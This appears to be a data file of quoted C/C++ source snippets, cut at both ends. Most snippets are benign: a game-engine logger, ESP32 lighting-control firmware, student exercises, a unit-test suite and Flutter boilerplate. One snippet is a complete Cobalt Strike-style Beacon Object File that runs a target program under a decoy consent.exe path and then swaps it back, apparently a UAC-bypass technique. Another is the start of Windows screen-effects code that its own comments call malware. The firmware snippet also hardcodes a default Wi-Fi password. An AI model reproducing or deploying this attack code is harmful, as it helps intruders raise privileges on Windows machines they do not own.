FLoggerSetting& Setting) const\n{\n\treturn (Setting.LogType == ELogType::ELT_Normal) ? 0 : (Setting.LogType == ELogType::ELT_Warning) ? 1 : 2;\n}\n\nvoid ULoggerSystem::PrintUE_ConsoleLog(const int32 Level, const FString& Message)\n{\n\tif (Level == 0)\n\t{\n\t\tUE_LOG(Logger, Log, TEXT(\"%s\"), *Message);\n\t}\n\tif (Level == 1)\n\t{\n\t\tUE_LOG(Logger, Warning, TEXT(\"%s\"), *Message);\n\t}\n\tif (Level == 2)\n\t{\n\t\tUE_LOG(Logger, Error, TEXT(\"%s\"), *Message);\n\t}\n}\n\nvoid ULoggerSystem::PrintUE_Log(const UObject* WorldContext, const bool IsUseWorldContextName, const FLoggerSetting& Setting, const bool IsPrintLogger, const bool IsPrintScreen, const bool IsConsoleLog)\n{\n\tconst auto LoggerTime = FString::Printf(TEXT(\"[%s] \"), *FDateTime::Now().ToString());\n\tconst auto Logg",
    "#include \"Windows.h\"\r\n#include \"base\\helpers.h\"\r\n\r\nextern \"C\" {\r\n#include \"beacon.h\"\r\n\r\n    char* generate_uuid() {\r\n        DFR_LOCAL(Rpcrt4, UuidCreate);\r\n        DFR_LOCAL(Rpcrt4, UuidToStringA);\r\n        UUID uuid;\r\n        UuidCreate(&uuid); \r\n        char* uuid_str = nullptr;\r\n        UuidToStringA(&uuid, (RPC_CSTR*)&uuid_str);  \r\n        return uuid_str;\r\n    }\r\n\r\n    void go(char* args, int len) {\r\n        DFR_LOCAL(MSVCRT, strcpy);\r\n        DFR_LOCAL(MSVCRT, strcat);\r\n        DFR_LOCAL(Kernel32, CreateDirectoryA);\r\n        DFR_LOCAL(Kernel32, CopyFileA);\r\n        DFR_LOCAL(Shell32, ShellExecuteA);\r\n        DFR_LOCAL(Kernel32, MoveFileA);\r\n\r\n        datap parser;\r\n        BeaconDataParse(&parser, args, len);\r\n        char* target = BeaconDataExtract(&parser, NULL);\r\n        char* parameters = BeaconDataExtract(&parser, NULL);\r\n        BeaconPrintf(CALLBACK_OUTPUT, \"target: %s\", target);\r\n        BeaconPrintf(CALLBACK_OUTPUT, \"parameters: %s\", parameters);\r\n        char* uuid_str1 = generate_uuid();\r\n        char fakeDir[128];\r\n        strcpy(fakeDir,\"C:\\\\Windows\\\\temp\\\\\");\r\n        strcat(fakeDir, uuid_str1);\r\n        CreateDirectoryA(fakeDir, NULL);\r\n        char fakePath[128];\r\n        strcpy(fakePath, fakeDir);\r\n        strcat(fakePath, \"\\\\consent.exe\");\r\n        BeaconPrintf(CALLBACK_OUTPUT, \"fakePath: %s\", fakePath);\r\n        CopyFileA(target, fakePath, FALSE);\r\n        ShellExecuteA(NULL, \"open\", fakePath, parameters, NULL, 0);\r\n        char* uuid_str2 = generate_uuid();\r\n        char realDir[128];\r\n        strcpy(realDir, \"C:\\\\Windows\\\\temp\\\\\");\r\n        strcat(realDir, uuid_str2);\r\n        MoveFileA(fakeDir, realDir);\r\n        CreateDirectoryA(fakeDir, NULL);\r\n        CopyFileA(\"C:\\\\Windows\\\\System32\\\\consent.exe\", fakePath, FALSE);\r\n        char realPath[128];\r\n        strcpy(realPath, realDir);\r\n        strcat(realPath, \"\\\\consent.exe\");\r\n        BeaconPrintf(CALLBACK_OUTPUT, \"realPath: %s\", realPath);\r\n    }\r\n}",
    "#include <ArtnetWiFi.h>\n// #include <ArtnetEther.h>\n#include \"ESPDMX.h\"\n#include <ESPAsyncWebServer.h>\n#include <SPIFFS.h>\n#include \"routes/config.h\"\n\nDMXESPSerial dmx1;\nDMXESPSerial dmx2;\n\nAsyncWebServer server(80);\n\nArtnetWiFi artnet;\nDMXESPSerial dmx;\n\nconst uint16_t size = 512;\nuint8_t data[size];\n\nvoid setup()\n{\n    Serial.begin(9600);\n\n    config.begin(\"dmx\", true);\n\n    uint8_t universe1 = config.getUChar(\"universe-1\", 1);\n    uint8_t universe2 = config.getUChar(\"universe-2\", 1);\n\n    Direction direction1 = static_cast<Direction>(config.getUInt(\"direction-1\", 0));\n    Direction direction2 = static_cast<Direction>(config.getUInt(\"direction-2\", 1));\n\n    Connection connection = static_cast<Connection>(config.getUInt(\"connection\", WiFiSta));\n    IpMethod ipMethod = static_cast<IpMethod>(config.getUInt(\"ip-method\"), Static);\n\n    String ssid = config.getString(\"ssid\", \"artnet\");\n    String pwd = config.getString(\"password\", \"mbgmbgmbg\");\n    IPAddress defaultIp(192, 168, 1, 201);\n    IPAddress ip = config.getUInt(\"ip\", defaultIp);\n    IPAddress defaultSubnet(255, 255, 255, 0);\n    IPAddress subnet = config.getUInt(\"subnet\", defaultSubnet);\n    IPAddress defaultGateway(192, 168, 1, 1);\n    IPAddress gateway = config.getUInt(\"gateway\", defaultGateway);\n\n    config.end();\n\n    // WiFi stuff\n    // WiFi.begin(ssid, pwd);\n    WiFi.softAP(ssid, pwd);\n    WiFi.softAPConfig(ip, gateway, subnet);\n    // WiFi.config(ip, gateway, subnet);\n    // while (WiFi.status() != WL_CONNECTED) {\n    //     Serial.print(\".\");\n    delay(500);\n    //}\n    // Serial.print(\"WiFi connected, IP = \");\n    // Serial.println(WiFi.localIP());\n\n    // Initialize Art-Net\n    artnet.begin();\n\n    // Initialize DMX ports\n    dmx1.init(19, -1);\n\n    // if Artnet packet comes to this universe, this function is called\n    artnet.subscribeArtDmxUniverse(universe1, [&](const uint8_t *data, uint16_t size, const ArtDmxMetadata &metadata, const ArtNetRemoteInfo &remote)\n                                   {\n                                    for (size_t i = 0; i < size; ++i)\n                                    {\n                                        dmx1.write((i + 1), data[i]);\n                                    }\n\n                                    dmx1.update(); });\n\n    // if Artnet packet comes, this function is called to every universe\n    artnet.subscribeArtDmx([&](const uint8_t *data, uint16_t size, const ArtDmxMetadata &metadata, const ArtNetRemoteInfo &remote) {});\n\n    if (!SPIFFS.begin(true))\n    {\n        Serial.println(\"An Error has occurred while mounting SPIFFS\");\n        return;\n    }\n\n    server.serveStatic(\"/\", SPIFFS, \"/\").setDefaultFile(\"index.html\");\n\n    server.on(\"/config\", HTTP_GET, [](AsyncWebServerRequest *request)\n              { onGetConfig(request); });\n\n    server.on(\"/config\", HTTP_DELETE, [](AsyncWebServerRequest *request)\n              {\n                config.begin(\"dmx\", false);\n                config.clear();\n                config.end();\n                // respond with default config\n                onGetConfig(request);\n\n                ESP.restart(); });\n\n    server.onRequestBody([](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total)\n                         {\n                            if (request->url() == \"/config\" && request->method() == HTTP_PUT) {\n                                onPutConfig(request, data, len, index, total);\n                                ESP.restart();\n                            } });\n\n    delay(1000);\n    server.begin();\n    Serial.println(\"Server started!\");\n}\n\nvoid loop()\n{\n    artnet.parse(); // check if artnet packet has come and execute callback\n}\n",
    "\ufeff#include<iostream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nvoid func1(float*& var1, int& var2);\nvoid func2(float* var3, int var4);\n\nint main()\n{\n\tfloat* arrayAddress = new float(30);\n\tint arrayLength = 0;\n\n\tcout << \"----Before----\" << \"\\n\";\n\tcout << \"Array address: \" << arrayAddress << \"\\n\";\n\tcout << \"Array length: \" << arrayLength << \"\\n\";\n\n\tfunc1(arrayAddress, arrayLength);\n\n\tcout << \"----After----\" << \"\\n\";\n\tcout << \"Array address: \" << arrayAddress << \"\\n\";\n\tcout << \"Array length: \" << arrayLength << \"\\n\";\n\n\tfunc2(arrayAddress, arrayLength);\n\n\treturn 0;\n}\n\nvoid func1(float*& var1, int& var2) \n{\n\tif (var1 != nullptr)\n\t\tdelete var1;\n\n\tconst int arrayLength = 20;\n\n\tfloat* array = new float[20];\n\n\tvar1 = array;\n\n\tvar2 = arrayLength;\n\n\tsrand(time(0));\n\n\tfor (int i = 0; i < arrayLength; i++)\n\t{\n\t\tarray[i] = rand();\n\t}\n}\n\n\nvoid func2(float* var3, int var4)\n{\n\tif (var3 == nullptr)\n\t\treturn;\n\n\tcout << \"###START PRINT###\" << \"\\n\";\n\tfor (int i = 0; i < var4; i++)\n\t{\n\t\tcout << \"Element [\" << i + 1 << \"]: \" << *(var3 + i) << \"\\n\";\n\t}\n\tcout << \"###END PRINT###\" << \"\\n\";\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include \"Polynomial.h\"\r\nusing namespace std;\r\ntemplate <typename T>\r\nostream& operator<<(ostream& os, const vector<T> & v)\r\n{\r\n    os << '[';\r\n    for (int i = 0; i < v.size(); ++i)\r\n    {\r\n        if (i != v.size() - 1)\r\n        {\r\n            os << v[i] << \", \";\r\n        }else\r\n        {\r\n            os << v[i];\r\n        }\r\n    }\r\n    os << ']' << endl;\r\n    return os;\r\n}\r\nvoid inputCoefficients(Polynomial& poly) {\r\n    int degree;\r\n    cin >> degree;\r\n\r\n    vector<double> coeffs(degree + 1);\r\n\r\n    for (int i = 0; i <= degree; ++i)\r\n    {\r\n        cin >> coeffs[i];\r\n    }\r\n\r\n    poly.setCoefficients(coeffs);\r\n}\r\nint main()\r\n{\r\n    Polynomial p1, p2;\r\n    inputCoefficients(p1);\r\n    inputCoefficients(p2);\r\n    cout << \"Polynomial 1: \" << p1 << endl;\r\n    cout << \"Polynomial 2: \" << p2 << endl;\r\n    cout << \"Sum: \" << p1 + p2 << endl;\r\n    cout << \"Subtraction: \" <<  p1 - p2 << endl;\r\n    cout << \"Product: \" << p1 * p2 << endl;\r\n    cout << \"Degree of Polynomial 1: \" << p1.degree() << endl;\r\n    cout << \"Evaluation of P1 at x = 2: \" << p1.evaluate(2) << endl;\r\n    cout << \"Derivative of P1: \" << p1.derivative() << endl;\r\n    cout << \"Integral of P1: \" << p1.integral() << endl;\r\n    cout << \"Integral of P1 from 0 to 1: \" << p1.integral(0,1) << endl;\r\n    cout << \"Real roots of P1: \" << p1.getRoots() << endl;\r\n\r\n}",
    "// ===========================================================\n#pragma once\n#include \"../core/cc.hpp\"\n// ===========================================================\n\nclass let\n{\npublic:\n    any data;\n\n    template <typename T>\n    let(T value)\n    {\n        data = value;\n    }\n\n    let &operator<<(const string &value)\n    {\n        if (data.type() == typeid(string))\n        {\n            any_cast<string>(data) += value;\n        }\n        else\n        {\n            echo(\"Error: Cannot use << with non-string types!\");\n        }\n        return *this;\n    }\n\n    template <typename T>\n    let &operator>>(T value)\n    {\n        data = value;\n        return *this;\n    }\n\n    friend std::ostream &operator<<(std::ostream &os, const let &obj)\n    {\n\n        if (obj.data.type() == typeid(int))\n        {\n            os << any_cast<int>(obj.data);\n        }\n        else if (obj.data.type() == typeid(string))\n        {\n            os << any_cast<string>(obj.data);\n        }\n        else\n        {\n            os << \"Unsupported type\";\n        }\n\n        return os;\n    }\n};\n",
    "#include \"cpptest.h\"\n\n/* CPPTEST_TEST_SUITE_CODE_BEGIN AdditionalIncludes */\n/* CPPTEST_TEST_SUITE_CODE_END AdditionalIncludes */\n\nCPPTEST_CONTEXT(\"/ATMproject/src/Account.cxx\");\nCPPTEST_TEST_SUITE_INCLUDED_TO(\"/ATMproject/src/Account.cxx\");\n\nclass TestSuite_Account_cxx_15e9a265 : public CppTest_TestSuite\n{\n    public:\n        CPPTEST_TEST_SUITE(TestSuite_Account_cxx_15e9a265);\n        CPPTEST_TEST_SUITE_SETUP(testSuiteSetUp);\n        CPPTEST_TEST_SUITE_TEARDOWN(testSuiteTearDown);\n        CPPTEST_TEST(test_case_unknown_display);\n        CPPTEST_TEST(test_case_secure_display);\n        CPPTEST_TEST(test_case_desposit_operations);\n        CPPTEST_TEST(test_case_manual);\n        CPPTEST_TEST_SUITE_END();\n        \n        static void testSuiteSetUp();\n        static void testSuiteTearDown();\n\n        void setUp();\n        void tearDown();\n\n        void test_case_unknown_display();\n        void test_case_secure_display();\n        static void CppTest_StubCallback_test_case_secure_display_1_BaseDisplay_getType(CppTest_StubCallInfo* stubCallInfo, ::BaseDisplay::DisplayType* __return, ::BaseDisplay* __this);//CPPTEST_TEST_CASE_CALLBACK void test_case_secure_display();\n        void test_case_desposit_operations();\n        static void CppTest_StubCallback_test_case_desposit_operations_1_BaseDisplay_getType(CppTest_StubCallInfo* stubCallInfo, ::BaseDisplay::DisplayType* __return, ::BaseDisplay* __this);//CPPTEST_TEST_CASE_CALLBACK void test_case_desposit_operations();\n        void test_case_manual();\n};\n\nCPPTEST_TEST_SUITE_REGISTRATION(TestSuite_Account_cxx_15e9a265);\n\nvoid TestSuite_Account_cxx_15e9a265::testSuiteSetUp()\n{\n/* CPPTEST_TEST_SUITE_CODE_BEGIN TestSuiteSetUp */\n/* CPPTEST_TEST_SUITE_CODE_END TestSuiteSetUp */\n}\n\nvoid TestSuite_Account_cxx_15e9a265::testSuiteTearDown()\n{\n/* CPPTEST_TEST_SUITE_CODE_BEGIN TestSuiteTearDown */\n/* CPPTEST_TEST_SUITE_CODE_END TestSuiteTearDown */\n}\n\nvoid TestSuite_Account_cxx_15e9a265::setUp()\n{\n/* CPPTEST_TEST_SUITE_CODE_BEGIN TestCaseSetUp */\n/* CPPTEST_TEST_SUITE_CODE_END TestCaseSetUp */\n}\n\nvoid TestSuite_Account_cxx_15e9a265::tearDown()\n{\n/* CPPTEST_TEST_SUITE_CODE_BEGIN TestCaseTearDown */\n/* CPPTEST_TEST_SUITE_CODE_END TestCaseTearDown */\n}\n\n/* CPPTEST_TEST_CASE_BEGIN test_case_unknown_display */\n// @REQ REQ-123\n/* CPPTEST_TEST_CASE_CONTEXT int Account::listTransactions(BaseDisplay &, UserRequest) */\nvoid TestSuite_Account_cxx_15e9a265::test_case_unknown_display()\n{\n/* CPPTEST_TEST_CASE_DATA_BEGIN */\n#if 0\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<testcase>\n    <metadata/>\n    <steps>\n        <step id=\"MultiVariableStep\" uid=\"0\" version=\"1\">\n            <step id=\"VariableStep\" version=\"1\">\n                <name>_cpptest_TestObject</name>\n                <type>::Account</type>\n                <value/>\n            </step>\n            <step id=\"VariableStep\" version=\"1\">\n                <name>_display</name>\n                <type>::BaseDisplay</type>\n                <value/>\n            </step>\n            <step id=\"VariableStep\" version=\"1\">\n                <name>_type</name>\n                <type>::UserRequest</type>\n                <value>::UserRequest::REQUEST_INVALID</value>\n            </step>\n        </step>\n        <step id=\"CallStep\" uid=\"1\" version=\"1\">\n            <comment>Tested function call</comment>\n            <return>int _return </return>\n            <name>_cpptest_TestObject.listTransactions</name>\n            <params>_display, _type</params>\n        </step>\n        <step id=\"AssertionsStep\" uid=\"2\" version=\"1\">\n            <comment>Post-condition check (outcome)</comment>\n            <step id=\"AssertionStep\" uid=\"2.0\" version=\"1\">\n                <type>CPPTEST_ASSERT_INTEGER_EQUAL</type>\n                <P1>0</P1>\n                <P2>_return</P2>\n                <P3/>\n                <P4/>\n            </step>\n            <step id=\"AssertionStep\" uid=\"2.1\" version=\"1\">\n                <type>CPPTEST_ASSERT_INTEGER_EQUAL</type>\n                <P1>0</P1>\n                <P2>_cpptest_TestObject.myAccountNumber</P2>\n                <P3/>\n                <P4/>\n            </step>\n            <step id=\"AssertionStep\" uid=\"2.2\" version=\"1\">\n                <type>CPPTEST_ASSERT_FLOAT_EQUAL_DELTA</type>\n                <P1>0</P1>\n                <P2>_cpptest_TestObject.myBalance</P2>\n                <P3>0.01</P3>\n                <P4/>\n            </step>\n            <step id=\"AssertionStep\" uid=\"2.3\" version=\"1\">\n                <type>CPPTEST_ASSERT_CSTR_N_EQUAL</type>\n                <P1>\"\"</P1>\n                <P2>_cpptest_TestObject.myPassword.c_str()</P2>\n                <P3>256</P3>\n                <P4/>\n            </step>\n        </step>\n    </steps>\n</testcase>\n\n#endif\n/* CPPTEST_TEST_CASE_DATA_END */\n::Account _cpptest_TestObject;\n::BaseDisplay _display;\n::UserRequest _type = ::UserRequest::REQUEST_INVALID;\n/* CPPTEST_TC_STEP_UID:1 */\nint _return  = _cpptest_TestObject.listTransactions(_display, _type);\n/* CPPTEST_TC_STEP_UID:2.0 */\nCPPTEST_A",
    "#include <Windows.h>\r\n#include <tchar.h>\r\n#include <windowsx.h>\r\n#include <stdio.h>\r\n#include <gdiplus.h>\r\n#pragma comment(lib, \"winmm.lib\")\r\n#pragma comment(lib, \"Msimg32.lib\")\r\n#define M_PI   3.14159265358979323846264338327950288\r\n#include <math.h>\r\n#include <ctime>\r\n#include <time.h>\r\ntypedef union _RGBQUAD {\r\n\tCOLORREF rgb;\r\n\tstruct {\r\n\t\tBYTE b;\r\n\t\tBYTE g;\r\n\t\tBYTE r;\r\n\t\tBYTE Reserved;\r\n\t};\r\n}_RGBQUAD, *PRGBQUAD;\r\n//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);\r\n//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);\r\ntypedef struct\r\n{\r\n\tFLOAT h;\r\n\tFLOAT s;\r\n\tFLOAT l;\r\n} HSL;\r\n\r\nnamespace Colors\r\n{\r\n\t//These HSL functions was made by Wipet, credits to him!\r\n\t//OBS: I used it in 3 payloads\r\n\r\n\t//Btw ArTicZera created HSV functions, but it sucks unfortunatelly\r\n\t//So I didn't used in this malware.\r\n\r\n\tHSL rgb2hsl(RGBQUAD rgb)\r\n\t{\r\n\t\tHSL hsl;\r\n\r\n\t\tBYTE r = rgb.rgbRed;\r\n\t\tBYTE g = rgb.rgbGreen;\r\n\t\tBYTE b = rgb.rgbBlue;\r\n\r\n\t\tFLOAT _r = (FLOAT)r / 255.f;\r\n\t\tFLOAT _g = (FLOAT)g / 255.f;\r\n\t\tFLOAT _b = (FLOAT)b / 255.f;\r\n\r\n\t\tFLOAT rgbMin = min(min(_r, _g), _b);\r\n\t\tFLOAT rgbMax = max(max(_r, _g), _b);\r\n\r\n\t\tFLOAT fDelta = rgbMax - rgbMin;\r\n\t\tFLOAT deltaR;\r\n\t\tFLOAT deltaG;\r\n\t\tFLOAT deltaB;\r\n\r\n\t\tFLOAT h = 0.f;\r\n\t\tFLOAT s = 0.f;\r\n\t\tFLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);\r\n\r\n\t\tif (fDelta != 0.f)\r\n\t\t{\r\n\t\t\ts = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));\r\n\t\t\tdeltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\t\t\tdeltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\t\t\tdeltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);\r\n\r\n\t\t\tif (_r == rgbMax)      h = deltaB - deltaG;\r\n\t\t\telse if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;\r\n\t\t\telse if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;\r\n\t\t\tif (h < 0.f)           h += 1.f;\r\n\t\t\tif (h > 1.f)           h -= 1.f;\r\n\t\t}\r\n\r\n\t\thsl.h = h;\r\n\t\thsl.s = s;\r\n\t\thsl.l = l;\r\n\t\treturn hsl;\r\n\t}\r\n\r\n\tRGBQUAD hsl2rgb(HSL hsl)\r\n\t{\r\n\t\tRGBQUAD rgb;\r\n\r\n\t\tFLOAT r = hsl.l;\r\n\t\tFLOAT g = hsl.l;\r\n\t\tFLOAT b = hsl.l;\r\n\r\n\t\tFLOAT h = hsl.h;\r\n\t\tFLOAT sl = hsl.s;\r\n\t\tFLOAT l = hsl.l;\r\n\t\tFLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);\r\n\r\n\t\tFLOAT m;\r\n\t\tFLOAT sv;\r\n\t\tFLOAT fract;\r\n\t\tFLOAT vsf;\r\n\t\tFLOAT mid1;\r\n\t\tFLOAT mid2;\r\n\r\n\t\tINT sextant;\r\n\r\n\t\tif (v > 0.f)\r\n\t\t{\r\n\t\t\tm = l + l - v;\r\n\t\t\tsv = (v - m) / v;\r\n\t\t\th *= 6.f;\r\n\t\t\tsextant = (INT)h;\r\n\t\t\tfract = h - sextant;\r\n\t\t\tvsf = v * sv * fract;\r\n\t\t\tmid1 = m + vsf;\r\n\t\t\tmid2 = v - vsf;\r\n\r\n\t\t\tswitch (sextant)\r\n\t\t\t{\r\n\t\t\tcase 0:\r\n\t\t\t\tr = v;\r\n\t\t\t\tg = mid1;\r\n\t\t\t\tb = m;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 1:\r\n\t\t\t\tr = mid2;\r\n\t\t\t\tg = v;\r\n\t\t\t\tb = m;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tr = m;\r\n\t\t\t\tg = v;\r\n\t\t\t\tb = mid1;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tr = m;\r\n\t\t\t\tg = mid2;\r\n\t\t\t\tb = v;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 4:\r\n\t\t\t\tr = mid1;\r\n\t\t\t\tg = m;\r\n\t\t\t\tb = v;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 5:\r\n\t\t\t\tr = v;\r\n\t\t\t\tg = m;\r\n\t\t\t\tb = mid2;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\trgb.rgbRed = (BYTE)(r * 255.f);\r\n\t\trgb.rgbGreen = (BYTE)(g * 255.f);\r\n\t\trgb.rgbBlue = (BYTE)(b * 255.f);\r\n\r\n\t\treturn rgb;\r\n\t}\r\n}\r\nint red, green, blue;\r\nbool ifcolorblue = false, ifblue = false;\r\nCOLORREF Hue(int length) { //Credits to Void_/GetMBR\r\n\tif (red != length) {\r\n\t\tred < length; red++;\r\n\t\tif (ifblue == true) {\r\n\t\t\treturn RGB(red, 0, length);\r\n\t\t}\r\n\t\telse {\r\n\t\t\treturn RGB(red, 0, 0);\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tif (green != length) {\r\n\t\t\tgreen < length; green++;\r\n\t\t\treturn RGB(length, green, 0);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tif (blue != length) {\r\n\t\t\t\tblue < length; blue++;\r\n\t\t\t\treturn RGB(0, length, blue);\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tred = 0; green = 0; blue = 0;\r\n\t\t\t\tifblue = true;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nDWORD WINAPI balls(LPVOID lpParam) {\r\n\tint w = GetSystemMetrics(0), h = GetSystemMetrics(1);\r\n\tint signX = 1;\r\n\tint signY = 1;\r\n\tint signX1 = 1;\r\n\tint signY1 = 1;\r\n\tint incrementor = 10;\r\n\tint x = 10;\r\n\tint y = 10;\r\n\twhile (1) {\r\n\t\tHDC hdc = GetDC(0);\r\n\t\tint top_x = 0 + x;\r\n\t\tint top_y = 0 + y;\r\n\t\tint bottom_x = 100 + x;\r\n\t\tint bottom_y = 100 + y;\r\n\t\tx += incrementor * signX;\r\n\t\ty += incrementor * signY;\r\n\t\tHBRUSH brush = CreateSolidBrush(Hue(239));\r\n\t\tSelectObject(hdc, brush);\r\n\t\tEllipse(hdc, top_x, top_y, bottom_x, bottom_y);\r\n\t\tif (y >= GetSystemMetrics(SM_CYSCREEN))\r\n\t\t{\r\n\t\t\tsignY = -1;\r\n\t\t}\r\n\r\n\t\tif (x >= GetSystemMetrics(SM_CXSCREEN))\r\n\t\t{\r\n\t\t\tsignX = -1;\r\n\t\t}\r\n\r\n\t\tif (y == 0)\r\n\t\t{\r\n\t\t\tsignY = 1;\r\n\t\t}\r\n\r\n\t\tif (x == 0)\r\n\t\t{\r\n\t\t\tsignX = 1;\r\n\t\t}\r\n\t\tSleep(10);\r\n\t\tDeleteObject(brush);\r\n\t\tReleaseDC(0, hdc);\r\n\t}\r\n}\r\n\r\nDWORD WINAPI shader1(LPVOID lpvd) { //credits to soheil shahrab, but I modified it\r\n\tHDC hdc = GetDC(NULL);\r\n\tHDC hdcCopy = CreateCompatibleDC(hdc);\r\n\tint screenWidth = GetSystemMetrics(SM_CXSCREEN);\r\n\tint screenHeight = GetSystemMetrics(SM_CYSCREEN);\r\n\tBITMAPINFO bmpi = { 0 };\r\n\tHBITMAP bmp;\r\n\tbmpi.bmiHeader.biSize = sizeof(bmpi);\r\n\tbmpi.bmiHeader.biWidth = screenWidth;\r\n\tbmpi.bmiHeader.biHeight = screenHeight;\r\n\tbmpi.bmiHeader.biPlanes = 1;\r\n\tbmpi.bmiHeader.biBitCount = 32;\r\n\tbmpi.bmiHeader.biCompression = BI_RGB;\r\n\tRGBQ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dummy_api_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include \"startups.h\"\n#include <fstream>\n#include \"listeStartUp.h\"\n#include <iterator>\n#include <map>\n#include <iomanip>\n\nusing namespace std;\n\nListeStartUps::ListeStartUps() {}\n//destructeur\nListeStartUps::~ListeStartUps()\n{\n    list<StartUp*>::iterator it;\n      for( it = listeStratUp.begin(); it != listeStratUp.end(); ++it) {\n        delete *it;\n    }\n    listeStratUp.clear();\n}\n//recopie\n ListeStartUps::ListeStartUps(const ListeStartUps& l )\n {\n     list<StartUp*>::iterator it;\n     list<StartUp*> list1 = l.listeStratUp;\n     for ( it = list1.begin(); it != list1.end(); ++it) {\n        StartUp* nouveauStartUp = new StartUp(**it);\n        listeStratUp.push_back(nouveauStartUp);\n    }\n }\n//surcharge op=\nListeStartUps&  ListeStartUps::operator=(const ListeStartUps& l)\n{\n    list<StartUp*>::iterator it;\n   if(this != &l) {\n        for ( it = listeStratUp.begin(); it != listeStratUp.end(); ++it) {\n            delete *it;\n        }\n        listeStratUp.clear();\n        list<StartUp*> list1 = l.listeStratUp;\n        for ( it = list1.begin(); it != list1.end(); ++it) {\n            StartUp* nouveauStartUp = new StartUp(**it);\n            listeStratUp.push_back(nouveauStartUp);\n        }\n    }\n    return *this;\n}\n\n void ListeStartUps::ajouterStartUp(StartUp* startup) {\n        listeStratUp.push_back(startup);\n    }\n\nvoid ListeStartUps::affecterProjet(int idStartup, Projet* projet) {\n\n    list<StartUp*>::iterator it;\n\n    for( it = listeStratUp.begin(); it != listeStratUp.end(); ++it)\n    {\n\n        if ((*it)->getId_startUp() == idStartup) {\n            (*it)->ajouterProjet(*projet);\n        }\n    }\n}\n\nvoid ListeStartUps::afficherProjetsDeStartUp(int idStartup) {\n    bool startupTrouvee = false;\n    list<StartUp*>::iterator it;\n    for( it = listeStratUp.begin(); it != listeStratUp.end(); ++it)\n        {\n        if ((*it)->getId_startUp() == idStartup) {\n            startupTrouvee = true;\n            const vector<Projet*>& projets = (*it)->getTabProjet();\n            for (int j = 0; j < projets.size(); ++j) {\n                cout << *(projets[j]) << endl;\n            }\n            break;\n        }\n    }\n    if (!startupTrouvee) {\n        cout << \"StartUp avec l'ID \" << idStartup << \" non trouvee.\" << endl;\n    }\n}\n\n int ListeStartUps::tailleTabStratUp() const {\n        return listeStratUp.size();\n    }\n\n StartUp* ListeStartUps::getStartUp(int index) const {\n         if (index < 0) {\n        return nullptr;\n        }\n\n        auto it = listeStratUp.begin();\n        advance(it, index);\n\n        if (it != listeStratUp.end()) {\n        return *it;\n        } else {\n            return nullptr;\n        }\n    }\n\nvoid ListeStartUps::remplirFichierProjets(ofstream& fichier) {\n\n    list<StartUp*>::iterator it;\n    for(it = listeStratUp.begin(); it != listeStratUp.end(); ++it) {\n        StartUp& startup = **it;\n\n        fichier << \"StartUp: \" << startup.getNom_stratUp() << endl;\n\n        const vector<Projet*>& projets = startup.getTabProjet();\n        for (int j = 0; j < projets.size(); ++j) {\n            fichier << \"Projet: \" << projets[j]->getNomProjet() << endl;\n        }\n        fichier << endl;\n    }\n\n}\n\nStartUp* ListeStartUps::getStartUpById(int id)  {\n    list<StartUp*>::iterator it;\n    for( it = listeStratUp.begin(); it != listeStratUp.end(); ++it) {\n        if ((*it)->getId_startUp() == id) {\n            return *it;\n        }\n    }\n    return nullptr;\n}\n\n///pour map\nvoid ListeStartUps::ajouterFinMap(StartUp* s)\n{\n    map<int,StartUp>::iterator it;\n    for(it=map1.begin();it!=map1.end();++it)\n    {\n        if((it->second.getId_startUp())==(s->getId_startUp()))\n        {\n            cout<<\"l'element existe deja dans le map\"<<endl;\n        }\n    }\n    map1.insert(pair<int,StartUp>(s->getId_startUp(),*s));\n}\n\nvoid 